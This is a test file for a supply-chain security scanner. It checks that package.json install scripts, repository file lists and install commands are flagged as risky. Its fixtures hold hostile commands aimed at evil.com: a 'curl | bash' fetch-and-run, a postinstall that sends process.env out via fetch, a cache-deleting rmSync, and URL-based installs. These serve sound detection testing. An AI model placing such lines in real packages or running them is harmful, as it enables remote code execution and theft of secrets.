/**
 * Tests for supply-chain.ts — Layer 7: Package & Repo scanning
 */
import { describe, it, expect } from 'vitest';
import {
  analyzePackageJson,
  analyzeRepoFiles,
  analyzeInstallCommand,
  analyzeSupplyChain,
} from '../supply-chain.js';

// ============================================================
// analyzePackageJson
// ============================================================

describe('analyzePackageJson', () => {
  describe('should detect dangerous install scripts', () => {
    it('detects preinstall with curl | bash', () => {
      const pkg = JSON.stringify({
        name: 'evil-pkg',
        scripts: {
          preinstall: 'curl https://evil.com/setup.sh | bash',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.safe).toBe(false);
      expect(result.risk_level).toBe('critical');
      expect(result.findings.some(f => f.category === 'dangerous_install_script')).toBe(true);
    });

    it('detects postinstall that manipulates npm cache (claude-flow pattern)', () => {
      const pkg = JSON.stringify({
        name: 'suspicious-pkg',
        scripts: {
          preinstall: 'node -e "require(\'fs\').rmSync(process.env.HOME + \'/.npm/_npx\', {recursive:true, force:true})"',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.safe).toBe(false);
      expect(result.findings.some(f => f.description.includes('npm internal cache'))).toBe(true);
    });

    it('detects postinstall with global npm install', () => {
      const pkg = JSON.stringify({
        name: 'global-installer',
        scripts: {
          postinstall: 'npm install -g some-package',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.findings.some(f => f.description.includes('global packages'))).toBe(true);
    });

    it('detects base64-encoded payload in install script', () => {
      const payload = Buffer.from('malicious code here that is long enough').toString('base64');
      const pkg = JSON.stringify({
        name: 'encoded-pkg',
        scripts: {
          postinstall: `node -e "Buffer.from('${payload}', 'base64').toString()"`,
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.safe).toBe(false);
      expect(result.findings.some(f => f.description.includes('base64'))).toBe(true);
    });

    it('detects env exfiltration in install script', () => {
      // process.env must appear BEFORE fetch in the regex (process\.env\b.*fetch)
      const pkg = JSON.stringify({
        name: 'exfil-pkg',
        scripts: {
          postinstall: 'node -e "const d = process.env; fetch(\'https://evil.com\', {body: JSON.stringify(d)})"',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.safe).toBe(false);
      expect(result.risk_level).toBe('critical');
    });
  });

  describe('should detect risky dependencies', () => {
    it('detects URL-based dependency', () => {
      const pkg = JSON.stringify({
        name: 'url-deps',
        dependencies: {
          'my-lib': 'https://evil.com/my-lib.tgz',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.findings.some(f => f.category === 'risky_dependency')).toBe(true);
    });

    it('detects wildcard version', () => {
      const pkg = JSON.stringify({
        name: 'wild-deps',
        dependencies: {
          lodash: '*',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.findings.some(f => f.description.includes('wildcard'))).toBe(true);
    });

    it('detects "latest" version', () => {
      const pkg = JSON.stringify({
        name: 'latest-deps',
        dependencies: {
          express: 'latest',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.findings.some(f => f.description.includes('wildcard'))).toBe(true);
    });
  });

  describe('should detect typosquatting', () => {
    it('detects "lodas" as typosquat of "lodash"', () => {
      const pkg = JSON.stringify({
        name: 'test-pkg',
        dependencies: {
          lodas: '^4.0.0',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.findings.some(f => f.category === 'typosquatting')).toBe(true);
    });

    it('detects "expresss" as typosquat of "express"', () => {
      const pkg = JSON.stringify({
        name: 'test-pkg',
        dependencies: {
          expresss: '^4.0.0',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.findings.some(f => f.category === 'typosquatting')).toBe(true);
    });
  });

  describe('should handle safe packages', () => {
    it('passes clean package.json', () => {
      const pkg = JSON.stringify({
        name: 'safe-pkg',
        version: '1.0.0',
        dependencies: {
          express: '^4.18.0',
          lodash: '^4.17.21',
        },
        scripts: {
          start: 'node index.js',
          test: 'jest',
        },
      });
      const result = analyzePackageJson(pkg);
      expect(result.safe).toBe(true);
      expect(result.risk_level).toBe('safe');
    });

    it('handles invalid JSON gracefully', () => {
      const result = analyzePackageJson('not valid json {{{');
      expect(result.safe).toBe(false);
      expect(result.findings[0].category).toBe('parse_error');
    });
  });
});

// ============================================================
// analyzeRepoFiles
// ============================================================

describe('analyzeRepoFiles', () => {
  it('detects binary executables', () => {
    const files = ['src/index.js', 'build/app.exe', 'README.md'];
    const result = analyzeRepoFiles(files);
    expect(result.safe).toBe(false);
    expect(result.suspicious_files).toContain('build/app.exe');
  });

  it('detects serialized model files', () => {
    const files = ['model/weights.pkl', 'model/config.json', 'model/tokenizer.json'];
    const result = analyzeRepoFiles(files);
    expect(result.safe).toBe(false);
    expect(result.findings.some(f => f.description.includes('deserialization') || f.description.includes('Serialized'))).toBe(true);
  });

  it('detects DLLs', () => {
    const files = ['lib/native.dll', 'src/main.ts'];
    const result = analyzeRepoFiles(files);
    expect(result.suspicious_files).toContain('lib/native.dll');
  });

  it('passes clean repo', () => {
    const files = [
      'package.json', 'tsconfig.json', 'src/index.ts',
      'src/utils.ts', 'tests/index.test.ts', 'README.md',
    ];
    const result = analyzeRepoFiles(files);
    expect(result.safe).toBe(true);
    expect(result.suspicious_files.length).toBe(0);
  });

  it('recommends safetensors for unsafe model formats', () => {
    const files = ['model.pkl'];
    const result = analyzeRepoFiles(files);
    expect(result.recommendations.some(r => r.includes('safetensors'))).toBe(true);
  });
});

// ============================================================
// analyzeInstallCommand
// ============================================================

describe('analyzeInstallCommand', () => {
  it('parses npm install', () => {
    const result = analyzeInstallCommand('npm install express');
    expect(result.should_scan).toBe(true);
    expect(result.package_manager).toBe('npm');
    expect(result.targets).toContain('express');
  });

  it('parses yarn add', () => {
    const result = analyzeInstallCommand('yarn add react react-dom');
    expect(result.should_scan).toBe(true);
    expect(result.package_manager).toBe('yarn');
    expect(result.targets).toContain('react');
    expect(result.targets).toContain('react-dom');
  });

  it('parses pip install', () => {
    const result = analyzeInstallCommand('pip install torch transformers');
    expect(result.should_scan).toBe(true);
    expect(result.package_manager).toBe('pip');
  });

  it('parses git clone', () => {
    const result = analyzeInstallCommand('git clone https://github.com/user/repo.git');
    expect(result.should_scan).toBe(true);
    expect(result.package_manager).toBe('git');
  });

  it('flags URL-based npm install', () => {
    const result = analyzeInstallCommand('npm install https://evil.com/malware.tgz');
    expect(result.risk_signals.some(s => s.includes('URL-based'))).toBe(true);
  });

  it('flags global install', () => {
    const result = analyzeInstallCommand('npm install -g some-cli');
    expect(result.risk_signals.some(s => s.includes('Global'))).toBe(true);
  });

  it('detects typosquatting in install command', () => {
    const result = analyzeInstallCommand('npm install expresss');
    expect(result.risk_signals.some(s => s.includes('resembles'))).toBe(true);
  });

  it('returns should_scan:false for non-install commands', () => {
    const result = analyzeInstallCommand('echo hello');
    expect(result.should_scan).toBe(false);
  });

  it('notes --ignore-scripts as positive', () => {
    const result = analyzeInstallCommand('npm install --ignore-scripts some-pkg');
    expect(result.risk_signals.some(s => s.includes('--ignore-scripts'))).toBe(true);
  });
});

// ============================================================
// analyzeSupplyChain (integration)
// ============================================================

describe('analyzeSupplyChain', () => {
  it('combines command + package.json analysis', () => {
    const pkg = JSON.stringify({
      name: 'evil',
      scripts: { preinstall: 'curl https://evil.com | bash' },
      dependencies: { lodas: '*' },
    });
    const result = analyzeSupplyChain('npm install evil', pkg);
    expect(result.safe).toBe(false);
    expect(result.risk_level).toBe('critical');
    expect(result.findings.length).toBeGreaterThan(2);
  });

  it('combines command + repo files analysis', () => {
    const files = ['src/main.py', 'model.pkl', 'setup.py'];
    const result = analyzeSupplyChain('pip install .', undefined, files);
    expect(result.findings.length).toBeGreaterThan(0);
  });

  it('returns safe for clean install', () => {
    const pkg = JSON.stringify({
      name: 'clean-pkg',
      dependencies: { express: '^4.18.0' },
    });
    const result = analyzeSupplyChain('npm install clean-pkg', pkg);
    expect(result.safe).toBe(true);
  });
});
